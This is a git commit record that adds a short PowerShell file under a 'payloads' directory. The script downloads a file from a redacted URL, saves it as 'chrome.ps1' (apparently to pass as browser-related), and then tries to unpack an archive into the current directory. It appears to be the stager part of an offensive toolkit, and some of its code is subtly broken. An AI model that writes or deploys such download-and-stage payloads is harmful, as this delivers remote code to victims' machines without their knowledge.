bbad91c7a3d1e7b7baf572998d39b9725c64254f
Fabio Castro <fabiocastro@riseup.net>
2017-10-30 23:42:04 -0200

    rename the file

---
+++ data/payloads/powershell/powershell.ps1
@@ -0,0 +1,15 @@
+
+$URL = "******"
+$FILE = Get-Location
+
+Function Get-Webfile ($url)
+{
+ (new-object net.webclient).DownloadFile($url,'chrome.ps1')
+}
+
+Function Get-Unzip ($file) {
+    Expand-Archive -Path $file -DestinationPath Get-Location
+}
+
+Get-Webfile($URL)
+Get-Unzip($FILE)
